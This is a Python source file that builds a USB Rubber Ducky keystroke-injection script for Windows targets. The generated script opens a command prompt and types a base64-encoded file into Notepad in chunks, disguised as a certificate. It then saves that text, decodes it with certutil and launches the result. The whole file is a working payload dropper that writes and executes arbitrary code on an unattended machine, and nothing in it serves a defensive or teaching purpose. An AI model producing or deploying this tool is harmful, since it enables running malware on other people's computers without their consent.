import os

def make_ducky_script(file):
    
    import os
    import base64
    import shutil
    filesdirremovedot = file.replace('.', '')
    filesdir = f"{filesdirremovedot}_files"
    if os.path.isdir(filesdir) == True:
        shutil.rmtree(filesdir)
    os.mkdir(filesdir)
    base = open(file, "rb")
    base1 = base.read()
    scriptfilename = f"{filesdir}/{filesdirremovedot}_output.txt"
    base64_encoded = base64.b64encode(base1).decode("utf-8")
    ducky = open(f"{scriptfilename}", "w")
    duckyscriptstart = f'''DELAY 1000
GUI r
DELAY 500
STRING cmd.exe
DELAY 500
ENTER
DELAY 750
STRING cd %temp%
DELAY 500
ENTER
STRING set ran=%random%
DELAY 500
ENTER
STRING mkdir {filesdirremovedot}_dir
DELAY 500
ENTER
STRING cd {filesdirremovedot}_dir
DELAY 500
ENTER
STRING echo hello>{filesdirremovedot}_base64
DELAY 500
ENTER
STRING notepad {filesdirremovedot}_base64
DELAY 500
ENTER
DELAY 750
CTRL a
BACKSPACE
DELAY 300\n'''
    ducky.write(duckyscriptstart)
    input_string = base64_encoded
    chunk_size = 64
    timeout = 400
    enddelay = 10000
    ducky.write("STRING -----BEGIN CERTIFICATE-----\nENTER\n")
    ducky.write(f"DELAY {timeout}\n")
    for i in range(0, len(input_string), chunk_size):
            chunk = input_string[i:i + chunk_size]
            ducky.write(f"STRING {chunk}\nDELAY {timeout}\nENTER\n")
    ducky.write("STRING -----END CERTIFICATE-----\nENTER\n")
    duckyscriptend = f'''DELAY 10000
CTRL s
DELAY {enddelay}
ALT F4
DELAY 750
STRING certutil -decode {filesdirremovedot}_base64 {file} && start {file} && exit
DELAY 500
ENTER'''
    ducky.write(duckyscriptend)
    ducky.close


    print("done")


if __name__ == "__main__":
    make_ducky_script("test.txt")

